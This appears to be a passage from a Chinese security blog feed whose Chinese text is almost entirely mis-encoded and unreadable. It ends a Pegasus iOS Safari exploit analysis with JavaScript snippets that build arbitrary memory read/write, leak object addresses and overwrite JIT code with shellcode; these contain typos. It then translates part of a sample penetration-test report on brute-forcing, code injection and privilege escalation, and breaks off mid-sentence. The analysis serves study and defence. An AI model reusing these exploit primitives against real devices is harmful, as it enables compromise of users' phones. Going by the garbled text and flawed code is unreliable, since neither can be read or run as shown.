class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var DATAVIEW_ARRAYBUFFER_OFFSET = <span class="number">0x10</span>;</span><br><span class="line">var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + <span class="number">4</span>;</span><br><span class="line">var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + <span class="number">4</span>;</span><br><span class="line">var FAST_TYPED_ARRAY_MODE = <span class="number">0</span>;</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, <span class="number">0</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, <span class="number">0xFFFFFFFF</span> , <span class="literal">true</span>);</span><br><span class="line">...</span><br><span class="line">dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure></p><p>å‘dataview_rw DataViewä¸­å†™å…¥ä¸‰ä¸ªåç§»é‡ã€‚é¦–å…ˆï¼ŒæŒ‡å‘åå¤‡å‘é‡çš„æŒ‡é’ˆæŒ‡å‘é›¶åœ°å€ã€‚ç„¶åå°†DataViewçš„é•¿åº¦è®¾ç½®ä¸º<code>0xFFFFFFFF</code>ï¼Œæœ‰æ•ˆåœ°è®¾ç½®DataViewä»¥æ˜ å°„è¿›ç¨‹çš„æ‰€æœ‰è™šæ‹Ÿå†…å­˜ã€‚æœ€åï¼Œå°†æ¨¡å¼è®¾ç½®ä¸ºç®€å•ç±»å‹ï¼ˆå³<code>FastTypedArray</code>ï¼‰ï¼Œå…è®¸åœ¨ç»™å®šè™šæ‹Ÿåœ°å€çš„æƒ…å†µä¸‹å°†åç§»é‡è®¡ç®—åˆ°DataViewä¸­ã€‚<code>dataview_rw DataView</code>ç°åœ¨é€šè¿‡å®ƒå…¬å¼€çš„getTypeå’ŒsetTypeæ–¹æ³•æä¾›ä»»æ„è¯»/å†™åŸè¯­ã€‚</p><h4 id="æ³„æ¼å¯¹è±¡åœ°å€"><a href="#æ³„æ¼å¯¹è±¡åœ°å€" class="headerlink" title="æ³„æ¼å¯¹è±¡åœ°å€"></a>æ³„æ¼å¯¹è±¡åœ°å€</h4><p>æ‰€éœ€çš„æœ€åä¸€ä¸ªåŸè¯­å¯ä»¥æš´éœ²ä»»æ„JavaScriptå¯¹è±¡çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€‚ä½¿ç”¨ä¸Šé¢åˆ©ç”¨çš„ç›¸åŒé—®é¢˜æ¥æ³„æ¼å•ä¸ªå¯¹è±¡çš„åœ°å€è€Œä¸æ˜¯æš´éœ²æ•´ä¸ªå­˜å‚¨å™¨ç©ºé—´æ¥å®ç°è¯¥åŸè¯­ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var dummy_ab = <span class="keyword">new</span> ArrayBuffer (<span class="number">0x20</span>);</span><br><span class="line">...</span><br><span class="line">var dataview_leak_addr = <span class="keyword">new</span> DataView ( dummy_ab);</span><br><span class="line">var dataview_dv_leak = <span class="keyword">new</span> DataView (dummy_ab);</span><br><span class="line">setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);</span><br><span class="line">...</span><br><span class="line">setImpureGetterDelegate (dataview_leak_addr, object_to_leak );</span><br><span class="line">leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture);</span><br></pre></td></tr></table></figure></p><p>åŒæ ·ï¼Œä½¿ç”¨è™šæ‹ŸArrayBufferä½œä¸ºä¸¤è€…çš„æ”¯æŒå‘é‡åˆ›å»ºä¸¤ä¸ªDataViewã€‚æ¥ä¸‹æ¥ï¼Œç”¨æŒ‡å‘<code>dataview_leak_addr</code>çš„æŒ‡é’ˆæ¥åˆ©ç”¨è¯¥é—®é¢˜å»ç ´å<code>dataview_dv_leak</code>çš„<code>m_vector</code>æˆå‘˜ã€‚ä¸ºæ³„æ¼ä»»æ„JavaScriptå¯¹è±¡çš„åœ°å€ï¼Œç¬¬äºŒæ¬¡è§¦å‘è¯¥é—®é¢˜ã€‚è¿™æ¬¡ï¼Œdataview_leak_addr DataViewçš„m_vectorè¢«éœ€æ³„éœ²çš„å¯¹è±¡çš„åœ°å€ä»£æ›¿ã€‚æœ€åï¼Œå¯ä»¥è¯»å–<code>dataview_dv_leak DataView</code>ä¸­åç§»16ä¸ªå­—èŠ‚çš„dwordä»¥è·å–ç›®æ ‡å¯¹è±¡çš„åœ°å€ã€‚</p><h4 id="æœªç­¾åçš„æœ¬æœºä»£ç æ‰§è¡Œ"><a href="#æœªç­¾åçš„æœ¬æœºä»£ç æ‰§è¡Œ" class="headerlink" title="æœªç­¾åçš„æœ¬æœºä»£ç æ‰§è¡Œ"></a>æœªç­¾åçš„æœ¬æœºä»£ç æ‰§è¡Œ</h4><p>å¦‚ç¬¬1é˜¶æ®µSafariæ¼æ´åˆ©ç”¨ä¸­æ‰€ä½¿ç”¨çš„é‚£æ ·ï¼ŒPegasusåœ¨æœ¬æ”»å‡»ä¸­ä½¿ç”¨ç›¸åŒçš„æœºåˆ¶æ¥è·å–ä»£ç æ‰§è¡Œæƒé™ã€‚è¯¥æ¼æ´åˆ›å»ºäº†ä¸€ä¸ªå¯æ‰§è¡Œæ˜ å°„ï¼Œå…¶ä¸­åŒ…å«è¦æ‰§è¡Œçš„shellcodeã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„ï¼Œåˆ›å»ºäº†ä¸€ä¸ªJSFunctionå¯¹è±¡ï¼ˆå«æœ‰æ•°ç™¾ä¸ªç©ºçš„try / catchå—ï¼Œç¨åå°†è¢«è¦†ç›–ï¼‰ã€‚ä¸ºäº†å¸®åŠ©ç¡®ä¿JITå°†JavaScriptç¼–è¯‘ä¸ºæœ¬æœºä»£ç ï¼Œéšåä¼šé‡å¤è°ƒç”¨è¯¥å‡½æ•°ã€‚é‰´äºJavaScriptCoreåº“çš„æ€§è´¨ï¼Œæ­¤JITç¼–è¯‘çš„æœ¬æœºä»£ç å°†é©»ç•™åœ¨æ˜ å°„ä¸ºè¯»/å†™/æ‰§è¡Œçš„å†…å­˜åŒºåŸŸä¸­ã€‚<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var body =<span class="string">' '</span></span><br><span class="line"><span class="keyword">for</span> (var k=<span class="number">0</span>; k&lt;<span class="number">0x600</span>; k++)&#123;</span><br><span class="line">body+= 'try () catch(e) ();';</span><br><span class="line">&#125;</span><br><span class="line">var to_overwrite = <span class="keyword">new</span> Function(<span class="string">'a'</span>, body);</span><br><span class="line"><span class="keyword">for</span> (var i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">to_overwrite();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç„¶åå¯ä»¥è¯»å–æ­¤JSFunctionå¯¹è±¡çš„åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥è¯»å–å„ç§æˆå‘˜ä»¥è·å–RWXæ˜ å°„çš„åœ°å€ã€‚ç„¶åç”¨shellcodeè¦†ç›–JITed try / catchå—ï¼Œå¹¶ä¸”å¯ä»¥ç®€å•åœ°è°ƒç”¨<code>to_overwriteï¼ˆï¼‰</code>å‡½æ•°æ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> ios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>penetration test report interpretation</title>
      <link href="/2019/03/28/penetration-test-report-interpretation/"/>
      <url>/2019/03/28/penetration-test-report-interpretation/</url>
      
        <content type="html"><![CDATA[<p><em>è€å¸ˆå¸ƒç½®çš„ä¸€é¡¹ä»»åŠ¡ï¼Œdeployä¸°å¯Œåšå®¢</em></p><hr><h2 id="æ¸—é€æµ‹è¯•æŠ¥å‘Š"><a href="#æ¸—é€æµ‹è¯•æŠ¥å‘Š" class="headerlink" title="æ¸—é€æµ‹è¯•æŠ¥å‘Š"></a>æ¸—é€æµ‹è¯•æŠ¥å‘Š</h2><p>ç›®å½•<br>æ‰§è¡Œæ€»ç»“    3<br>ç»“è®ºæ€»ç»“    3<br>æ”»å‡»è®°å™    3<br>è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥    3<br>ç®¡ç†å‘˜ç½‘ç»œæœåŠ¡å™¨ç•Œé¢æ”»å‡»    5<br>å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨    7<br>ææƒ    9<br>JAVAå®¢æˆ·æœºæ”»å‡»    9<br>å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜    11<br>æ·±åŒ…æ£€æµ‹è§„é¿    12<br><a id="more"></a><br>Citrixç¯å¢ƒä¸‹çš„æ¼æ´    14<br>å‡çº§ä¸ºåŸŸç®¡ç†å‘˜    17<br>æ€»è®º    19<br>å»ºè®®    20<br>é£é™©ç­‰çº§    20<br>é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³    21<br>é£é™©ç­‰çº§èŒƒå›´    21<br>é»˜è®¤çš„æˆ–å¼±çš„å‡­è¯    21<br>å¯†ç é‡ç”¨    21<br>å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç     21<br>è¡¥ä¸ç®¡ç†    21<br>DNSåŒºåŸŸä¼ é€    22<br>é»˜è®¤APACHEæ–‡ä»¶ç›®å½•    22<br>é™„å½•B:å…³äºOffensive Security    22</p><h2 id="æ‰§è¡Œæ€»ç»“"><a href="#æ‰§è¡Œæ€»ç»“" class="headerlink" title="æ‰§è¡Œæ€»ç»“"></a>æ‰§è¡Œæ€»ç»“</h2><p>ä¸ºäº†æ£€æµ‹ç»è¿‡ä¸€æ¬¡è“„æ„æ”»å‡»ä¸­åä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼ŒMegaCory OneæˆæƒOffensive Securityè¿›è¡Œäº†è¿™ä¸€æ¬¡çš„æ¸—é€æµ‹è¯•ã€‚æˆ‘ä»¬æœ‰ä¸€ä¸ªå‡†åˆ™ï¼Œå°±æ˜¯ä¸ºäº†æ¨¡æ‹Ÿä¸€ä¸ªè“„æ„çš„æ”»å‡»è€…ï¼Œè¿™ä¸ªæ”»å‡»è€…çƒ­è¡·äºæ”»å‡»MegaCory Oneçš„ç³»ç»Ÿï¼Œå¹¶ä¸”æˆ‘ä»¬è¦è¾¾åˆ°ä¸‹åˆ—ç›®çš„ï¼š</p><p>ï¬    ç¡®è®¤è¿œç¨‹æ”»å‡»è€…èƒ½å¦ç ´åMegaCory Oneçš„é˜²å¾¡ç³»ç»Ÿ<br>ï¬    ç¡®è®¤æ”»å‡»æ‰€å¸¦æ¥çš„å½±å“:<br>ï¬    å…¬å¸é‡è¦æ•°æ®æ˜¯å¦æ³„éœ²<br>ï¬    MegaCory Oneä¿¡æ¯ç³»ç»Ÿå†…éƒ¨ç»“æ„æ˜¯å¦æ³„éœ²ä»¥åŠæ˜¯å¦å¯ç”¨</p><p>æˆ‘ä»¬çš„å·¥ä½œä¸»è¦æ˜¯åœ¨ç¡®è®¤å’Œåˆ©ç”¨ç³»ç»Ÿæ¼æ´ä¸Šï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™äº›æ¼æ´ä»¥æœªæˆæƒçš„æ–¹å¼è·å¾—ä¸€äº›é‡è¦æ•°æ®ã€‚è¿™äº›æ”»å‡»æ–¹å¼å¯èƒ½ä¸€ä¸ªåªä¼šä¸Šç½‘çš„äººä¹Ÿå¯ä»¥ç”¨ã€‚è¯„ä¼°æ˜¯æŒ‰ç…§NIST SP 800-115 ä¸­çš„æ ‡å‡†ä¸‹è¿›è¡Œçš„ï¼Œå¹¶ä¸”æ‰€æœ‰çš„æµ‹è¯•éƒ½æ˜¯å¯æ§çš„ã€‚</p><h2 id="ç»“è®ºæ€»ç»“"><a href="#ç»“è®ºæ€»ç»“" class="headerlink" title="ç»“è®ºæ€»ç»“"></a>ç»“è®ºæ€»ç»“</h2><p>å¯¹äºMegaCorp Oneå…¬å¸ç³»ç»Ÿçš„ç¬¬ä¸€æ¬¡æ£€æµ‹ï¼Œå°±å‘ç°äº†ä¸€ä¸ªé”™è¯¯é…ç½®çš„DNSæœåŠ¡å™¨ï¼Œå…¶å…è®¸è¿›è¡ŒåŒºåŸŸä¼ é€ã€‚è¿™ä¸ªæ¼æ´ç»™æ£€æµ‹æä¾›äº†è®¸å¤šå¯ä¾›æ”»å‡»çš„ä¸»æœºã€‚æ£€æŸ¥äº†è¿™äº›ä¸»æœºåï¼Œå‘ç°ä¸€ä¸ªå—å¯†ç ä¿æŠ¤çš„ç½‘ç«™æœåŠ¡å™¨ç•Œé¢ã€‚æˆ‘ä»¬é€šè¿‡ç©·ä¸¾æ”»å‡»çˆ†å‡ºäº†å¯†ç ä»è€Œèƒ½å¤Ÿè¿›å…¥ç½‘ç«™ï¼Œåœ¨å»ºäº†ç¬¦åˆç½‘ç«™å¯†ç çš„æ ¼å¼çš„éšæœºå­—æ¯è¡¨åã€‚</p><p>è¿™ä¸ªç®¡ç†ç•Œé¢éå¸¸è„†å¼±ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªè¿œç¨‹ä»£ç æ³¨å…¥æ¼æ´ï¼Œé€šè¿‡è¿™ä¸ªæ¼æ´å¯ä»¥è·å¾—å¯¹åº•å±‚æ“ä½œç³»ç»Ÿè®¿é—®çš„æƒé™ã€‚å› ä¸ºæ²¡æœ‰æ­£ç¡®çš„ç³»ç»Ÿæ›´æ–°ï¼Œè€Œä½¿æœ€åˆçš„å°é—®é¢˜å˜æˆäº†å¤§é—®é¢˜ã€‚è¿›ä¸€æ­¥æ£€æŸ¥åï¼Œå‘ç°ç®¡ç†ç”¨æˆ·å¯ä»¥åœ¨è¿™ä¸ªå—æŸçš„æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªJAVAç¨‹åºã€‚å½“æˆ‘ä»¬ä¸Šä¼ äº†æ¶æ„ä»£ç åï¼Œå–å¾—äº†è®¿é—®æƒé™ã€‚</p><p>åˆ©ç”¨è¿™ä¸ªæœåŠ¡å™¨çˆ†å‡ºçš„å¯†ç ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®å…ˆå‰ä¸èƒ½è®¿é—®çš„èµ„æºã€‚è¿™ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨æœ¬åœ°è´¦æˆ·å°±å¯ä»¥ç™»å½•è®¸å¤šçš„WINDOWSä¸»æœºï¼Œä¸€ä¸ªCITRIXçš„æœåŠ¡å™¨ï¼Œè¿˜æœ‰å¯¹äºWINDOWSæ´»åŠ¨ç›®å½•å®Œæ•´çš„æƒé™ã€‚é€šè¿‡å°†æ¶æ„æµé‡å°è£…è¿›åè®®é‡Œï¼Œç°æœ‰çš„æ¶æ„æµé‡æ§åˆ¶å°±å¯ä»¥é¿å¼€ã€‚</p><h2 id="æ”»å‡»è®°å™"><a href="#æ”»å‡»è®°å™" class="headerlink" title="æ”»å‡»è®°å™"></a>æ”»å‡»è®°å™</h2><h3 id="è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥"><a href="#è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥" class="headerlink" title="è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥"></a>è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥</h3><p>ä¸ºäº†æ›´å¥½çš„è¯„ä¼°ï¼ŒMegaCorp Oneæä¾›äº†å¾ˆå°‘çš„ä¿¡æ¯ï¼Œé™¤äº†ç»„ç»‡çš„åŸŸå:megacorpone.comã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æ›´ç¬¦åˆä¸€ä¸ªæ²¡æœ‰å¾—åˆ°å†…éƒ¨ä¿¡æ¯çš„æ”»å‡»è€…ã€‚ä¸ºäº†é¿å…æ”»å‡»å…¶ä»–ç»„ç»‡çš„ç³»ç»Ÿï¼Œåœ¨æ”»å‡»å‰ï¼Œæ‰€æœ‰ç³»ç»Ÿéƒ½è¿›è¡Œäº†æ‰€æœ‰æƒéªŒè¯ã€‚</p><p>æˆ‘ä»¬æ£€æŸ¥äº†megacorpone.comåŸŸåçš„DNSæœåŠ¡å™¨ï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰å¯èƒ½çš„æ”»å‡»ç›®æ ‡ã€‚</p><p>Figure 1-é€šè¿‡æ”¶é›†åŸŸåçš„ä¿¡æ¯æ‰¾åˆ°äº†ä¸‰ä¸ªDNSæœåŠ¡å™¨</p><p>åˆ©ç”¨è¿™å‡ ä¸ªæœåŠ¡å™¨ï¼Œæˆ‘ä»¬è¯•ç€å»è¿›è¡ŒåŒºåŸŸä¼ è¾“ã€‚å‘ç°ns2.megacorpone.comçš„åŒºåŸŸä¼ è¾“é…ç½®é”™è¯¯ã€‚è¿™æš´éœ²äº†è®¸å¤šçš„ä¸»æœºåå’Œå…¶ç›¸å…³çš„IPåœ°å€ï¼Œè¿™éå¸¸æœ‰å¸®åŠ©ã€‚ï¼ˆFigure 2ï¼‰åŒºåŸŸä¼ è¾“æä¾›ç»™æ”»å‡»è€…è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¿™ä¸ªç»„ç»‡çš„èŒèƒ½ï¼Œç½‘æ®µã€‚è¯¦ç»†è¯·çœ‹é™„å½•Aã€‚</p><p>Figure 2-ä¸€ä¸ªé”™è¯¯é…ç½®çš„DNSæœåŠ¡å™¨ï¼Œå…è®¸å®Œæ•´çš„äº”é™åˆ¶çš„åŒºåŸŸä¼ è¾“</p><p>è¿™äº›è¯†åˆ«å‡ºçš„ä¸»æœºæäº¤ç»™äº†MegaCorp Oneç¡®è®¤ï¼Œç¡®å®šæ•´ä¸ª50.7.67.Xç½‘æ®µéƒ½è¦åœ¨è¯„ä¼°èŒƒå›´å†…ã€‚è¿™äº›ä¸»æœºä¼šè¢«æ‰«æï¼Œæ¥ç€åˆ—ä¸¾å‡ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚ä¸ºäº†ç¡®å®šè¿™äº›æœåŠ¡å™¨æ½œåœ¨çš„æ¼æ´ï¼Œå®ƒä»¬ä¼šè¢«ä»”ç»†çš„æ£€æŸ¥ã€‚</p><p>é€šè¿‡æšä¸¾æŠ€æœ¯å’Œç½‘ç»œæ‰«æï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„MegaCorp Oneç½‘ç»œçš„ç»“æ„ã€‚</p><p>åœ¨Figure 3ä¸­å±•ç¤ºäº†ç›®æ ‡ç½‘ç»œç»“æ„ã€‚ä¾‹å¦‚æ·±åŒ…æ£€æŸ¥è¿™æ ·çš„é¢å¤–æ§åˆ¶ç»†èŠ‚ï¼Œä¼šåœ¨æ¥ä¸‹æ¥çš„è¯„ä¼°ä¸­æåˆ°ï¼Œè¿™é‡Œä¸ºå®Œæ•´æ€§ï¼Œå…ˆè¯´ä¸€ç‚¹ã€‚</p><p>Figure 3-ç›®æ ‡ç½‘ç»œ</p><p>ç®¡ç†å‘˜ç½‘ç»œæœåŠ¡å™¨ç•Œé¢æ”»å‡»<br>Admin.megacorpone.comæœåŠ¡å™¨åœ¨81ç«¯å£ä¸Šè¿è¡Œç€ApacheæœåŠ¡ã€‚é€šè¿‡ç«™ç‚¹çš„æ ¹URLè®¿é—®ï¼Œå‘ç°äº†ä¸€ä¸ªç©ºç™½é¡µé¢ã€‚æ¥ä¸‹æ¥ï¼Œè¿›è¡Œä¸€æ¬¡å¿«é€Ÿçš„æšä¸¾æ‰«æï¼Œä»¥æœŸæ‰¾åˆ°å…¬ç”¨ç›®å½•å’Œæ–‡ä»¶ã€‚ï¼ˆFigure 4ï¼‰</p><p>Figure 4-admin.megacorpone.comçš„æšä¸¾æ”»å‡»æ­éœ²äº†ç½‘ç«™çš„æ–‡ä»¶ç»“æ„</p><p>æ‰«é¢çš„ç»“æœæ˜¾ç¤ºæ²¡æœ‰æ”¹å˜Apacheå…¬å…±é»˜è®¤ç›®å½•(è¯¦ç»†è¯·çœ‹é™„å½•A)ï¼Œæˆ‘ä»¬ç¡®å®š/adminæ˜¯å”¯ä¸€å¯é€šè¿‡èº«ä»½éªŒè¯çš„ç›®å½•ã€‚ï¼ˆFigure 5ï¼‰</p><p>Figure 5-adminç›®å½•å—å¯†ç ä¿æŠ¤</p><p>æˆ‘ä»¬å®šä½œäº†ä¸€ä¸ªåŸºäºè¯¥ç½‘ç«™å†…å®¹çš„å­—å…¸æ–‡ä»¶ï¼Œä¸ºäº†æš´åŠ›ç ´è§£å¯†ç ã€‚æœ€åˆçš„å­—å…¸åŒ…æ‹¬äº†331ä¸ªç‰¹æ„å­—ç¬¦ä¸²ï¼Œé€šè¿‡å‡ è½®ç½®æ¢ï¼Œå½¢æˆäº†æœ‰16201ä¸ªå­—ç¬¦ä¸²çš„å­—å…¸æ–‡ä»¶ã€‚ç”¨adminçš„ç”¨æˆ·åå’Œè¿™ä¸ªå­—å…¸æ¥æš´åŠ›ç ´è§£ã€‚</p><p>Figure 6-ä½¿ç”¨å­—å…¸æ”»å‡»æ¥è·å¾—ç®¡ç†å‘˜å¯†ç </p><p>æš´åŠ›æ”»å‡»æ‰¾åˆ°äº†adminç”¨æˆ·çš„å¯†ç â€nanotechnology1â€ã€‚åˆ©ç”¨è¿™ä¸ªè´¦æˆ·å°±èƒ½ä¸€æœªæˆæƒçš„æ–¹å¼å¾—åˆ°ç½‘ç«™å—ä¿æŠ¤éƒ¨åˆ†çš„å†…å®¹ã€‚ï¼ˆFigure 6ï¼‰è¯¦ç»†è¯·çœ‹é™„å½•Aï¼Œæ€ä¹ˆåˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚</p><p>è¿™é‡Œé¢æœ‰ä¸€ä¸ªSQLite ManageræœåŠ¡ç•Œé¢ï¼Œæ— éœ€ä»»ä½•å‡­è¯å°±å¯ä»¥è®¿é—®ã€‚åˆ©ç”¨è¿™ä¸ªç•Œé¢ï¼Œå‘ç°æ”¯æŒphpSQLiteCMSå®ä¾‹çš„æ•°æ®åº“ã€‚<a href="http://phpsqlitecms.net/" target="_blank" rel="noopener">http://phpsqlitecms.net/</a></p><p>Figure 7-ç½‘ç«™è¿è¡Œç€SQLiteæ•°æ®åº“<br>â€ƒ<br>é€šè¿‡è¿™ä¸ªç•Œé¢å°±å¯ä»¥è·å¾—æ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·åï¼Œä»¥åŠç›¸å…³çš„å¯†ç å“ˆå¸Œå€¼ã€‚ï¼ˆFigure 8ï¼‰</p><p>Figure 8-ç¼ºå°‘é¢å¤–çš„è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è·å¾—æ•°æ®ï¼Œä»â€userdataâ€è¿™ä¸ªæ•°æ®åº“</p><p>è¡¨ä¸­çš„å¯†ç hashå€¼ä¸ç¬¦åˆä»»ä½•æ ‡å‡†çš„æ ¼å¼ã€‚ä½¿ç”¨ä¸€ä¸ªå«â€phpselitecmsâ€çš„è½¯ä»¶ï¼ŒæŸ¥çœ‹æºä»£ç ä»¥ç¡®å®šhashå€¼æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯hashè´¦æˆ·çš„å¯†ç ã€‚</p><p>Figure 9-æŸ¥çœ‹æºç å‘ç°å¯†ç hashç”Ÿæˆç®—æ³•</p><p>çŸ¥é“äº†å¯†ç hashçš„æ ¼å¼ï¼Œè¿˜æœ‰éšæ„ç”Ÿæˆçš„åä¸ªå­—ç¬¦çš„saltå€¼ï¼Œå¯ä»¥å°†è¿™äº›hashå€¼è½¬å˜æˆç­‰ä»·çš„åŠ äº†saltçš„SHA1å€¼ï¼Œè¿›è¡Œæš´åŠ›æ”»å‡»ã€‚</p><p>å¾—åˆ°äº†ä¸¤ä¸ªæ˜æ–‡å¯†ç ï¼Œå°½ç®¡ä¸æ˜¯ç«‹é©¬å°±æœ‰ç”¨ï¼Œä½†å¯èƒ½åœ¨ç»„ç»‡é‡Œå…¶ä»–çš„ç³»ç»Ÿä¸­å¯ä»¥ç”¨åˆ°ã€‚</p><h3 id="å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨"><a href="#å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨" class="headerlink" title="å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨"></a>å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨</h3><p>å…ˆå‰å‘ç°çš„SQLite Manageræœ‰ä¸€ä¸ªè‘—åçš„ä»£ç æ³¨å…¥æ¼æ´ã€‚(<a href="https://www.exploit-db.com/exploits/24320)åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥è·å¾—shellï¼Œè¿›å…¥ç½‘ç«™æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨çš„ç³»ç»Ÿã€‚ä½¿ç”¨ä¸€ä¸ªæ”¹è‰¯è¿‡çš„å…¬å…±æ¼æ´åˆ©ç”¨åº“ï¼Œå¯ä»¥å¾—åˆ°admin.megacorpone.comæœåŠ¡å™¨ä¸Šæœ‰é™çš„äº¤äº’æƒã€‚è¯¦ç»†è¯·çœ‹é™„å½•A" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/24320)åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥è·å¾—shellï¼Œè¿›å…¥ç½‘ç«™æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨çš„ç³»ç»Ÿã€‚ä½¿ç”¨ä¸€ä¸ªæ”¹è‰¯è¿‡çš„å…¬å…±æ¼æ´åˆ©ç”¨åº“ï¼Œå¯ä»¥å¾—åˆ°admin.megacorpone.comæœåŠ¡å™¨ä¸Šæœ‰é™çš„äº¤äº’æƒã€‚è¯¦ç»†è¯·çœ‹é™„å½•A</a>.</p><p>Figure 10-åˆ©ç”¨ä¸€ä¸ªå…¬å¼€çš„å¯ç”¨çš„SQLiteæ¼æ´ï¼Œå°±èƒ½ä»¥æœªæˆæƒçš„æ–¹å¼è¿›å…¥ç³»ç»Ÿ</p><p>Figure 11-åªèƒ½å–å¾—www-dataè¿™ä¸ªç”¨æˆ·çš„æƒé™</p><p>MegaCorp Oneä½¿ç”¨çš„SQLite Managerçš„ç‰ˆæœ¬å’Œè¯¥å­˜åœ¨è¯¥æ¼æ´çš„ç‰ˆæœ¬æœ‰ä¸€äº›ä¸åŒã€‚å°½ç®¡ä½¿ç”¨çš„ç‰ˆæœ¬ä¹ŸåŒæ ·å­˜åœ¨ç›¸åŒçš„åº•å±‚é—®é¢˜ï¼Œä½†åœ¨æ²¡æœ‰ä¿®æ­£çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ¼æ´ä¸èƒ½å‘æŒ¥ä½œç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬æ·»åŠ äº†åŠŸèƒ½ï¼Œè®©å®ƒæ”¯æŒHTTPè®¤è¯ï¼Œé€‚åˆäºæ–°ç‰ˆæœ¬çš„SQLite Managerã€‚è¿™ä¸ªæ–°çš„æ¼æ´éšåä¼šå‘å¸ƒå‡ºå»ã€‚</p><p>åœ¨å›¾12ä¸­å¯ä»¥çœ‹åˆ°æ–¹æ¡ˆçš„å†…å®¹ã€‚</p><p>Figure 12-ç½‘ç»œæœåŠ¡å™¨çš„æ”»å‡»æ–¹æ¡ˆâ€ƒ</p><h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å½“å¾—åˆ°äº†åº•å±‚ç³»ç»Ÿçš„äº¤äº’æƒåï¼Œæˆ‘ä»¬ç»§ç»­å¯»æ‰¾å¯ä»¥æå‡æƒé™çš„æ–¹æ³•ã€‚éšåï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªå¯ä»¥å¯ä»¥åˆ©ç”¨çš„ææƒçš„æ¼æ´ã€‚(<a href="http://www.exploit-db.com/exploits/18411/)è¯¦ç»†ä¿¡æ¯è¯·çœ‹é™„å½•Aã€‚" target="_blank" rel="noopener">http://www.exploit-db.com/exploits/18411/)è¯¦ç»†ä¿¡æ¯è¯·çœ‹é™„å½•Aã€‚</a></p><p>Figure 13-ä½¿ç”¨ä¸€ä¸ªææƒçš„æ¼æ´ï¼Œè¯¥ä¸»æœºæ²¡æœ‰æ‰“è¡¥ä¸ï¼Œæ‰€ä»¥å¯ä»¥ç”¨</p><p>å› ä¸ºä¸Šä¼ 